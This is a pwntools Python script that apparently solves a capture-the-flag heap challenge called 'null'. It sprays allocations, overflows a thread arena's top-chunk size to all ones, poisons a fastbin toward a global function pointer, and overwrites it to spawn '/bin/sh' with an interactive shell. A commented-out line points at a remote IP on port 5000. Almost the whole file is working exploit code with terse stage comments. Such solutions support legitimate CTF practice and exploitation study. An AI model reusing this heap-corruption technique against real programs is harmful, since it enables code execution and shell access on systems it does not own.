#coding:utf-8
from pwn import *
import os 

context.arch='amd64'
#context.log_level= 'debug'

io = process('./null')
#io =remote('47.98.50.73',5000)
libc = ELF('./libc.so.6')

def init():
   io.recvuntil('\n')
   io.sendline('i\'m ready for challenge')
   

def null(size,padnum):
   io.recvuntil('Action: ')
   io.sendline('1')
   io.recvuntil('Size: ')
   io.sendline(str(size))
   io.recvuntil('Pad blocks: ')
   io.sendline(str(padnum))

if __name__ == '__main__':
    pause()
    init()
    io.recvuntil('exit\n')
    #null(0x3000,0)
    #io.recvuntil('Content? (0/1): ')
    #io.sendline('0')
    for i in range(0,16):
       null(0x1000-0x8,999)
       io.recvuntil('Content? (0/1): ')
       io.sendline('0')
    null(0x1000-0x8,383)
    io.recvuntil('Content? (0/1): ')
    io.sendline('0')
    null(0x720,0)
    io.recvuntil('Content? (0/1): ')
    io.sendline('0')
    #pause()
    
    for i in range(0,32):
       null(0x1000-0x8,999)
       io.recvuntil('Content? (0/1): ')
       io.sendline('0')
    null(0x1000-0x8,0x2fd-2)
    io.recvuntil('Content? (0/1): ')
    io.sendline('0')
    null(0xfb0-8,1)
    io.recvuntil('Content? (0/1): ')
    io.sendline('0')
    pause()

    '''
    ok! now the thread_arena heap[1] have the top chunk 
    and the size of top chunk is 0x1000
    '''
    null(0x1000-0x8-0x20,0)
    io.recvuntil('Content? (0/1): ')
    io.sendline('1')
    io.recvuntil('Input: ')
    io.send('x'.ljust(0x1000-0x28-1,'\x01'))#don't write \x00
    sleep(1)
    io.sendline('\x00'+'\xFF'*8)
    print '[!]debug'
    pause()
    
    #now top chunk size become 0xffffffffffffffff
    null(0xc0,0)
    io.recvuntil('Content? (0/1): ')
    io.sendline('1')
    io.recvuntil('Input: ')
    payload = 'a'*0x40 + p64(0)*2+p64(0x4000000)*2+p64(0x300000000)
    payload += p64(0x60201d)*10
    io.sendline(payload.ljust(0xc0-1,'\x00'))
    sleep(1)
    pause()
    
    #now fastbin have become 0x60201d,fun ptr in 0x602038
    #so we can malloc(0x70-0x10) and return 0x60202d
    null(0x60,0)
    io.recvuntil('Content? (0/1): ')
    io.sendline('1')
    io.recvuntil('Input: ')
    payload2 = '/bin/sh\x00'+'aaa'+p64(0x400978)
    io.sendline(payload2.ljust(0x60-1,'\x00'))
    sleep(1)
    io.interactive()
